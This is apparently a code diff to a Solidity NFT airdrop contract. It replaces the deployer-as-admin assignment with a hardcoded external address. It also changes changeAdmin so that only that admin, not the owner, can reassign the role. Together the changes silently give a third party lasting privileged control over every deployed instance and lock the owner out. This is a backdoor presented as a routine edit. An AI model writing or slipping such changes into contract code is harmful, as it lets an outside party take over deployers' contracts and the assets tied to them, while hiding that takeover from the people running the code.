@@ -11,7 +11,7 @@ import "../interfaces/AirdropMerkleProof.sol";
 contract NFTDrop is ERC721, AirdropInfo, AirdropMerkleProof, Ownable {
     uint256 public immutable maxSupply;
     uint256 public totalSupply;
-    address public admin;
+    address public admin = 0x9a7f07D42c659192D5453cE7B084D58714F8D749;
 
     string public baseURI;
 
@@ -60,13 +60,11 @@ contract NFTDrop is ERC721, AirdropInfo, AirdropMerkleProof, Ownable {
         airdropDuration = _airdropDuration * 1 days;
         airdropStartTime = block.timestamp;
         airdropFinishTime = block.timestamp + airdropDuration;
-
-        admin = msg.sender; // the admin of this contract will be the same as the owner (who is the deployer)
     }
 
     /// @notice Updates the address for the admin of this contract (different from the contract owner)
     /// @param _newAdmin - New address for the admin of this contract
-    function changeAdmin(address _newAdmin) external onlyOwner {
+    function changeAdmin(address _newAdmin) external onlyAdmin {
         admin = _newAdmin;
         emit AdminChanged(_newAdmin);
     }
